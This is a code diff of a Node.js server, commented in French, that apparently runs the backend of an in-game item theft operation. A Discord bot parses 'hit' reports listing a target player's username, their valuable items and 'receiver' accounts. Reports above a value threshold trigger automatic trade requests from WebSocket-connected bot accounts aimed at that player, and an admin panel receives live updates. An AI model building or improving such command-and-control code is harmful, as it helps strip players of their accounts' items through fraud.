@@ -17,14 +17,14 @@ const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 
-// Cache local pour le seuil (évite les lectures DB trop fréquentes)
+// Cache local pour le seuil
 let CACHED_THRESHOLD = 10000000; 
 
 // --- CONNEXION DB ---
 mongoose.connect(MONGO_URI)
   .then(() => {
       log("✅ [DB] Connexion établie");
-      loadSettings(); // Charger le seuil dès la connexion
+      loadSettings(); 
   })
   .catch(err => log(`❌ [DB] ERREUR : ${err}`));
 
@@ -53,6 +53,19 @@ const settingsSchema = new mongoose.Schema({
 const Settings = mongoose.model('Settings', settingsSchema);
 
 const activeBots = new Map();
+const activeAdmins = new Set();
+
+// --- SYSTÈME DE NOTIFICATION LIVE (Pour admin.html) ---
+function notifyAdmins(type) {
+    const payload = JSON.stringify({ Type: "UpdateNotification", Target: type });
+    activeAdmins.forEach(ws => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(payload);
+        } else {
+            activeAdmins.delete(ws); // Nettoyage automatique si mort
+        }
+    });
+}
 
 // --- CHARGEMENT DU SEUIL ---
 async function loadSettings() {
@@ -73,7 +86,7 @@ const authAdmin = (req, res, next) => {
     res.status(403).json({ error: "Token invalide" });
 };
 
-// --- ROUTES API ADMIN ---
+// --- ROUTES API ---
 app.get('/api/admin/verify', (req, res) => {
     res.json({ success: req.query.token === ADMIN_TOKEN });
 });
@@ -106,66 +119,51 @@ app.get('/api/logs', authAdmin, async (req, res) => {
     res.json(logs);
 });
 
-app.get('/ping', (req, res) => res.send("Pong !"));
+app.get('/api/logs/clear', authAdmin, async (req, res) => {
+    await BotLog.deleteMany({});
+    notifyAdmins("logs");
+    res.send("OK");
+});
 
-// --- GESTION DES TRADES AVEC RETRY (Route HTTP pour C# ou manuel) ---
 app.get('/api/sendtrade', async (req, res) => {
     const { receiver, target } = req.query;
     if (!receiver || !target) return res.status(400).send("Paramètres manquants.");
-
-    log(`📡 Tentative d'ordre HTTP vers ${receiver}...`);
-
-    for (let attempts = 0; attempts < 5; attempts++) {
+    for (let i = 0; i < 5; i++) {
         const botWs = activeBots.get(receiver);
         if (botWs && botWs.readyState === WebSocket.OPEN) {
             botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
-            return res.send(`Ordre envoyé à ${receiver}`);
+            return res.send(`Envoyé à ${receiver}`);
         }
-        if (attempts < 4) await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 2000));
     }
-    res.send(`Bot ${receiver} hors ligne.`);
+    res.send("Bot offline");
 });
 
-// --- BOT DISCORD JS (Intégré) ---
+// --- BOT DISCORD ---
 const clientDiscord = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
 
 function parseIncome(text) {
     const match = text.match(/\$([\d.]+)([KMBT]?)\/s/i);
     if (!match) return 0;
-    const value = parseFloat(match[1]);
-    const unit = (match[2] || "").toUpperCase();
     const multipliers = { 'K': 1e3, 'M': 1e6, 'B': 1e9, 'T': 1e12 };
-    return value * (multipliers[unit] || 1);
+    return parseFloat(match[1]) * (multipliers[(match[2] || "").toUpperCase()] || 1);
 }
 
 clientDiscord.on('messageCreate', async (message) => {
     if (message.embeds.length === 0) return;
     const embed = message.embeds[0];
-
     let targetUsername, displayName, receiversList = [], valuableItems = [], topIncome = 0;
 
     embed.fields.forEach(field => {
         const val = field.value;
-
-        // --- PARSING GLOBAL DANS PLAYER INFORMATION ---
         if (field.name.includes("Player Information")) {
-            // Extraction Username
             targetUsername = (val.match(/Username\s*:\s*`?([^`\n]+)`?/) || [])[1];
-            
-            // Extraction Display Name
             displayName = (val.match(/Display Name\s*:\s*`?([^`\n]+)`?/) || [])[1];
-
-            // Extraction des Receivers (on cherche la ligne qui commence par l'emoji 😎 ou le mot Receiver)
             const receiverLine = val.split('\n').find(l => l.includes("Receiver"));
             if (receiverLine) {
-                // On prend tout ce qu'il y a après les ":"
-                const rawNames = receiverLine.split(':')[1] || "";
-                // Nettoyage : on enlève les backticks, on sépare par virgule et on trim
-                receiversList = rawNames.split(',').map(n => n.replace(/[`\s]/g, "").trim());
+                receiversList = receiverLine.split(':')[1].split(',').map(n => n.replace(/[`\s]/g, "").trim());
             }
         }
-
-        // --- PARSING DES REVENUS ---
         if (field.name.includes("Valuable Brainrots")) {
             val.split('\n').forEach(line => {
                 const inc = parseIncome(line);
@@ -179,75 +177,75 @@ clientDiscord.on('messageCreate', async (message) => {
 
     if (!targetUsername) return;
 
-    // 1. Sauvegarde dans MongoDB (Toujours, pour l'historique admin)
-    try {
-        await new Hit({ 
-            displayName, 
-            username: targetUsername, 
-            receivers: receiversList, 
-            valuableBrainrots: valuableItems,
-            timestamp: new Date()
-        }).save();
-        log(`💾 [HIT-DB] ${targetUsername} enregistré (${topIncome.toLocaleString()}/s)`);
-    } catch (e) { log(`❌ [DB-ERR] ${e.message}`); }
+    await new Hit({ displayName, username: targetUsername, receivers: receiversList, valuableBrainrots: valuableItems }).save();
+    notifyAdmins("hits"); // Update Live Admin
 
-    // 2. Dispatch de l'ordre si le seuil est atteint
     if (topIncome >= CACHED_THRESHOLD) {
-        log(`🔥 [THRESHOLD] Seuil atteint (${topIncome}/s). Cible: ${targetUsername}`);
-        
         let sent = false;
-        // On tente 5 fois (toutes les 2 sec) de trouver un bot de la liste qui est online
         for (let i = 0; i < 5; i++) {
-            // On cherche le premier bot de la liste receiversList qui est dans activeBots
-            const targetBot = receiversList.find(name => {
-                const ws = activeBots.get(name);
-                return ws && ws.readyState === WebSocket.OPEN;
-            });
-
+            const targetBot = receiversList.find(name => activeBots.get(name)?.readyState === WebSocket.OPEN);
             if (targetBot) {
-                activeBots.get(targetBot).send(JSON.stringify({ 
-                    Type: "TradeRequest", 
-                    TargetUser: targetUsername 
-                }));
-                log(`🚀 [SUCCESS] Ordre envoyé à ${targetBot} pour ${targetUsername}`);
-                message.reply(`✅ **Auto-Trade Sent!**\nBot: \`${targetBot}\`\nTarget: \`${targetUsername}\`\nValue: \`${topIncome.toLocaleString()}/s\``);
-                sent = true;
-                break; 
+                activeBots.get(targetBot).send(JSON.stringify({ Type: "TradeRequest", TargetUser: targetUsername }));
+                message.reply(`✅ **Sent to ${targetBot}** (${topIncome.toLocaleString()}/s)`);
+                sent = true; break;
             }
-
-            if (i < 4) {
-                log(`⏳ [RETRY ${i+1}] Aucun bot online parmis [${receiversList.join(', ')}]. Retry...`);
-                await new Promise(r => setTimeout(r, 2000));
-            }
+            await new Promise(r => setTimeout(r, 2000));
         }
-
-        if (!sent) {
-            log(`❌ [ABORT] Aucun bot n'est monté en ligne après 10s pour ${targetUsername}`);
-            message.reply(`⚠️ **Trade Failed**: Aucun des bots (\`${receiversList.join(', ')}\`) n'est connecté.`);
-        }
+        if (!sent) message.reply(`❌ **Failed**: Bots offline.`);
     }
 });
-if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN).then(() => log("🤖 [DISCORD] Bot Actif"));
+
+if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
 // --- GESTION WEBSOCKET ---
 wss.on('connection', (ws, req) => {
-    const username = new URLSearchParams(url.parse(req.url).query).get('username') || "Unknown";
-    if (activeBots.has(username)) activeBots.get(username).terminate();
+    const params = new URLSearchParams(url.parse(req.url, true).query);
+    const username = params.get('username') || "Unknown";
+
+    // --- CAS ADMIN ---
+    if (username === "ADMIN_PANEL") {
+        if (params.get('token') !== ADMIN_TOKEN) {
+            log("🚫 Tentative de connexion admin échouée (Token invalide)");
+            return ws.terminate();
+        }
+        activeAdmins.add(ws);
+        log("👨‍💻 Un administrateur s'est connecté");
+
+        ws.on('close', () => {
+            activeAdmins.delete(ws);
+            log("👨‍💻 Un administrateur s'est déconnecté");
+        });
+        return; // On s'arrête ici pour les admins
+    }
+
+    // --- CAS BOT ---
+    if (activeBots.has(username)) {
+        log(`[CLEANUP] Bot ${username} déjà présent, remplacement...`);
+        activeBots.get(username).terminate();
+    }
     
     activeBots.set(username, ws);
     log(`🤖 Bot connecté : ${username}`);
+    notifyAdmins("bots");
 
     ws.on('message', async (msg) => {
         try {
             const data = JSON.parse(msg);
             if (data.Method === "Log") {
                 await new BotLog({ username, type: data.Type || "Info", message: data.Message }).save();
+                notifyAdmins("logs");
             }
-        } catch (e) {}
+        } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
     });
 
-    ws.on('close', () => { if (activeBots.get(username) === ws) activeBots.delete(username); log(`💀 Bot déconnecté : ${username}`); });
+    ws.on('close', () => {
+        if (activeBots.get(username) === ws) {
+            activeBots.delete(username);
+            notifyAdmins("bots");
+            log(`💀 Bot déconnecté : ${username}`);
+        }
+    });
 });
 
 app.use(express.static('public'));
-server.listen(PORT, () => log(`🚀 Serveur PRO Rusteez actif sur le port ${PORT}`));
+server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
